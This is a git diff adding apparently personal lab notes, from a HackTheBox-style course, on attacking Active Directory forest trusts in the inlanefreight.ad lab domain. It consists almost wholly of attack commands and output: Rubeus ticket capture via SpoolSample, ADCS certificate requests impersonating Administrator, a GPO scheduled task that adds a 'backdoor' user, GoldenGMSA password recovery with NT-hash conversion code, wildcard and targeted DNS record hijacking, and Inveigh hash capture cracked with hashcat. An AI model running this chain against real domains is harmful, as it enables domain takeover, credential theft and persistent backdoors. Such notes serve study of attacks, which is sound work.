@@ -1,5 +1,283 @@
 # Domain_trust
+in Forest
+# Unconstrained Delegation
 
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+.\SpoolSample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad
+
+.\Rubeus.exe renew /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEuDCCBLRhggSwMIIErKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEElOTEFORUZSRUlHSFQuQUSjggRoMIIEZKADAgESoQMCAQKiggRWBIIEUiKGeH01HZmPH6nlwjHAsXxDQdgn4SHCFrQwQRpZtxJHXQPzFIIqF9t8oCv6DUuwNYjh+pPHId3un39FC56ywWuwDjlLKI1MEFwlbPScO4JASAxE09MWMxyBDwjGs6dJZAG+roiHzHhetBCkBo5qel5lM28VYhv6qe5Eg43Cxmu5BQ9TRzssrtPuwhx9UAspIzfyV7a00gMnZKX6IZKc6yU+dhGJoICeFAHcFIvjHl0+m8l6BQG25uJOtuUREwpMWJ7F1Gv8kkWHLYjKZJ6Bhu5mITSfPFFY6nHViltdMN9JYiNcnBuGnTnNp+AVZKGU8RtBU5OAbQmYOJWCBSKY+R7ysPwwIeYBuiZ1gazmXVxellEnK2DAdkQNUp/nYxdZNM8CtNv<SNIP> /ptt
+
+dir \\.......
+
+# Configuration Naming Context (NC)
+Enumerate ACL's for WRITE access on Configuration Naming Context
+PS C:\Users\Administrator> $dn = "CN=Configuration,DC=INLANEFREIGHT,DC=AD"
+PS C:\Users\Administrator> $acl = Get-Acl -Path "AD:\$dn"
+PS C:\Users\Administrator> $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }
+
+# Abusing ADCS
+PS C:\Tools\> .\PsExec -s -i powershell
+PS C:\Windows\system32> mmc
+Request the Created Certificate
+.\Certify.exe request /ca:inlanefreight.ad\INLANEFREIGHT-DC01-CA /domain:inlanefreight.ad /template:"Copy of User" /altname:INLANEFREIGHT\Administrator
+Use Regex to Format the Certificate
+mxdelta@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
+mxdelta@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+PS C:\Tools> PS C:\Tools> .\Rubeus.exe asktgt /domain:inlanefreight.ad /user:Administrator /certificate:cert.pfx /ptt
+
+# GPO On Site Attack
+Create Group Policy Object (GPO)
+PS C:\Tools> $gpo = "Backdoor"
+PS C:\Tools> New-GPO $gpo
+DisplayName      : Backdoor
+DomainName       : dev.INLANEFREIGHT.AD
+Owner            : DEV\Domain Admins
+Id               : 656b8436-38f4-447c-9405-40ac83c34117
+GpoStatus        : AllSettingsEnabled
+Description      :
+CreationTime     : 2/20/2024 6:04:59 AM
+ModificationTime : 2/20/2024 6:04:59 AM
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 0, SysVol Version: 0
+WmiFilter        :
+
+Create a Scheduled Task inside GPO that Adds New User
+PS C:\Tools> Import-Module .\PowerView_2.ps1
+PS C:\Tools> New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"
+VERBOSE: Get-DomainSearcher search string: LDAP://DC=dev,DC=INLANEFREIGHT,DC=AD
+VERBOSE: Trying to weaponize GPO: {656B8436-38F4-447C-9405-40AC83C34117}
+
+Retrieving the Replication Site of the Root Domain Controller
+PS C:\Tools> Get-ADDomainController -Server inlanefreight.ad |Select ServerObjectDN
+ServerObjectDN
+--------------
+CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD
+
+Linking the GPO to the Default Site as SYSTEM
+
+        PowerShell-Session
+PS C:\Tools> .\PsExec.exe -s -i powershell.exe
+PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32> $sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD"
+PS C:\Windows\system32> New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.inlanefreight.ad
+GpoId       : 656B8436-38F4-447C-9405-40AC83C34117
+DisplayName : Backdoor
+Enabled     : True
+Enforced    : False
+Target      : CN=Default-First-Site-Name,cn=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD
+Order       : 1 
+
+Request a TGT for Backdoor
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe asktgt /user:backdoor /password:'B@ckdoor123' /domain:inlanefreight.ad /ptt
+
+# GoldenGMSA Attack
+Creating New gMSA Account
+
+        PowerShell-Session
+PS C:\Users\Administrator> New-ADServiceAccount -Name "apache-dev" -DNSHostName "inlanefreight.ad" -PrincipalsAllowedToRetrieveManagedPassword htb-student-1 -Enabled $True
+
+Use Psexec to open PowerShell as a SYSTEM user.
+
+        PowerShell-Session
+C:\Tools\> .\PsExec -s -i powershell
+
+Enumerating gMSA in Parent Domain
+
+        PowerShell-Session
+PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad
+sAMAccountName:         svc_devadm$
+objectSid:              S-1-5-21-2879935145-656083549-3766571964-1106
+rootKeyGuid:            ba932c0c-5c34-ce6e-fcb8-d441d116a736
+msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA
+----------------------------------------------
+
+Retrieving gMSA Password
+
+        PowerShell-Session
+PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --forest dev.inlanefreight.ad --domain inlanefreight.ad
+Base64 Encoded Password:        WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A== 
+
+
+Use Psexec to Open PowerShell as a SYSTEM User
+
+        PowerShell-Session
+C:\Tools\> .\PsExec -s -i powershell
+
+Retrieving msds-ManagedPasswordID
+
+        PowerShell-Session
+PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad
+sAMAccountName:         svc_devadm$
+objectSid:              S-1-5-21-2879935145-656083549-3766571964-1106
+rootKeyGuid:            ba932c0c-5c34-ce6e-fcb8-d441d116a736
+msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA
+----------------------------------------------
+
+Retrieving kdsinfo
+
+        PowerShell-Session
+PS C:\Tools> .\GoldenGMSA.exe kdsinfo --forest dev.inlanefreight.ad
+Guid:           ba932c0c-5c34-ce6e-fcb8-d441d116a736
+Base64 blob:    AQAAAAwsk7o0XG7O/LjUQdEWpzYAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGgAAABDAE4APQBEAEMAMAAxACwATwBVAD0ARABvAG0AYQBpAG4AIABDAG8AbgB0AHIAbwBsAGwAZQByAHMALABEAEMAPQBJAE4ATABBAE4ARQBGAFIARQBJAEcASABUACwARABDAD0AQQBEADB1nboTh9kB6Iuz6L+G2QEAAAAAAAAAAEAAAAAAAAAAKDDqBWv0BE7GIm2X9sCjfDGzhSfRwXb6NzrI1IuP45cdQ/9JfY4Uot2JHFw3QEGXuFruFNjHAsitBmN+gs+Shw==                                                                                                                        ----------------------------------------------
+----------------------------------------------
+
+Computing the gMSA Password Manually
+
+        PowerShell-Session
+PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --kdskey AQAAAAwsk7o0XG7O/LjUQdEWpzYAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGgAAABDAE4APQBEAEMAMAAxACwATwBVAD0ARABvAG0AYQBpAG4AIABDAG8AbgB0AHIAbwBsAGwAZQByAHMALABEAEMAPQBJAE4ATABBAE4ARQBGAFIARQBJAEcASABUACwARABDAD0AQQBEADB1nboTh9kB6Iuz6L+G2QEAAAAAAAAAAEAAAAAAAAAAKDDqBWv0BE7GIm2X9sCjfDGzhSfRwXb6NzrI1IuP45cdQ/9JfY4Uot2JHFw3QEGXuFruFNjHAsitBmN+gs+Shw== --pwdid AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA
+
+Base64 Encoded Password:        WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A== 
+
+Converting the Password to an NT hash
+
+Because, gMSA passwords are encrypted with non-printable characters and are harder to use directly, we can use Python's hashlib library to calculate the NT hash for the account based on the obtained password.
+
+        python
+import hashlib
+import base64
+ 
+base64_input  = "WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A=="
+
+print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())
+
+from Crypto.Hash import MD4
+import base64
+
+base64_input  = "WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A=="
+
+print(MD4.new(base64.b64decode(base64_input)).hexdigest())
+
+Converting Base64 Password to it's NT Hash
+
+        shellsession
+mxdelta@htb[/htb]$ python3 convert-to-nt.py
+32ac66cd327aa76b3f1ca6eb82a801c5
+
+Request a TGT for svc_devadm$
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe asktgt /user:svc_devadm$ /rc4:32ac66cd327aa76b3f1ca6eb82a801c5 /domain:inlanefreight.ad /ptt
+______        _
+
+# DNS Trust Attack
+Resolve Non-existing DNS Name
+
+        powershell
+PS C:\Tools> Resolve-DNSName TEST1.inlanefreight.ad
+Resolve-DNSName : TEST1.inlanefreight.ad : DNS name does not exist
+At line:1 char:1
++ Resolve-DNSName TEST1.inlanefreight.ad
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo          : ResourceUnavailable: (TEST1.inlanefreight.ad:String) [Resolve-DnsName], Win32Exception
++ FullyQualifiedErrorId : DNS_ERROR_RCODE_NAME_ERROR,Microsoft.DnsClient.Commands.ResolveDnsName     
+
+Open PowerShell as SYSTEM
+
+        PowerShell-Session
+C:\Tools\> .\PsExec -s -i powershell
+
+Adding Wildcard DNS Record
+
+        powershell
+PS C:\Tools> Import-module .\Powermad.ps1
+PS C:\Tools> New-ADIDNSNode -Node * -domainController DC01.inlanefreight.ad -Domain inlanefreight.ad -Zone inlanefreight.ad -Tombstone -Verbose
+VERBOSE: [+] Forest = INLANEFREIGHT.AD
+VERBOSE: [+] Distinguished Name = DC=*,DC=inlanefreight.ad,CN=MicrosoftDNS,DC=DomainDNSZones,DC=inlanefreight,DC=ad
+VERBOSE: [+] Data = 172.16.210.3
+VERBOSE: [+] DNSRecord = 04-00-01-00-05-F0-00-00-5D-00-00-00-00-00-02-58-00-00-00-00-1E-9B-38-00-AC-10-D2-03
+[+] ADIDNS node * added  
+
+Resolve Non-existing DNS Name
+
+        powershell
+PS C:\Tools> Resolve-DNSName TEST2.inlanefreight.ad
+Name                                           Type   TTL   Section    IPAddress
+----                                           ----   ---   -------    ---------
+TEST2.inlanefreight.ad                         A      599   Answer     172.16.210.3  
+
+PS C:\Tools> Resolve-DNSName ANYTHING.inlanefreight.ad
+Name                                           Type   TTL   Section    IPAddress
+----                                           ----   ---   -------    ---------
+ANYTHING.inlanefreight.ad                      A      599   Answer     172.16.210.3         
+
+
+A SYSTEM in child DC can view all the DNS Records present in Parent domain.
+Open PowerShell as SYSTEM
+
+        PowerShell-Session
+C:\Tools\> .\PsExec -s -i powershell
+
+Enumerate DNS records in Parent Domain
+
+        powershell
+PS C:\Tools> Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"
+
+HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
+--------                  ---------- ----       ---------            ----------      ----------
+@                         A          1          3/4/2024 3:00:00 PM  00:10:00        172.16.210.99
+@                         NS         2          0                    01:00:00        dc01.inlanefreight.ad.
+@                         SOA        6          0                    01:00:00        [95][dc01.inlanefreight.ad.][ho...
+dc01                      A          1          0                    01:00:00        172.16.210.99
+DEV01                     A          1          0                    01:00:00        172.16.210.7   
+
+
+Изменение DNS-записи для DEV01
+
+        PowerShell 
+PS C:\Tools> $Old = Get-DnsServerResourceRecord -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad -Name DEV01
+PS C:\Tools> $New = $Old.Clone()
+PS C:\Tools> $TTL = [System.TimeSpan]::FromSeconds(1)
+PS C:\Tools> $New.TimeToLive = $TTL
+PS C:\Tools> $New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')
+PS C:\Tools> Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad
+PS C:\Tools> Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"
+
+HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
+--------                  ---------- ----       ---------            ----------      ----------
+@                         A          1          3/15/2024 5:00:00 PM 00:10:00        172.16.210.99
+@                         NS         2          0                    01:00:00        dc01.inlanefreight.ad.
+@                         SOA        6          0                    01:00:00        [97][dc01.inlanefreight.ad.][ho...
+dc01                      A          1          0                    00:20:00        172.16.210.99
+DEV01                     A          1          0                    00:00:01        172.16.210.3
+
+
+Проверьте изменение IP-адреса для DEV01.
+
+        PowerShell 
+PS C:\Tools> Resolve-DnsName -Name DEV01.inlanefreight.ad -Server DC01.INLANEFREIGHT.AD
+Name                                           Type   TTL   Section    IPAddress
+----                                           ----   ---   -------    ---------
+DEV01.inlanefreight.ad                         A      599   Answer     172.16.210.3
+
+
+Запустите Inveigh для перехвата хеша
+
+        PowerShell 
+PS C:\Tools> Import-Module .\Inveigh.ps1
+PS C:\Tools> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y
+
+Взломайте хеш NTLMv2 с помощью Hashcat
+
+        shellsession 
+mxdelta@htb[/htb]$ hashcat -m 5600 buster_ntlmv2 /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+Запросите TGT для Бастера.
+
+        PowerShell-сессия 
+PS C:\Tools> .\Rubeus.exe asktgt /user:buster /domain:inlanefreight.ad /password:<SNIP> /ptt
+
+
+
+
+# За лесом
 
 Get-ADUser -Filter * -Server "CHILD-DC.child.inlanefreight.ad"
 
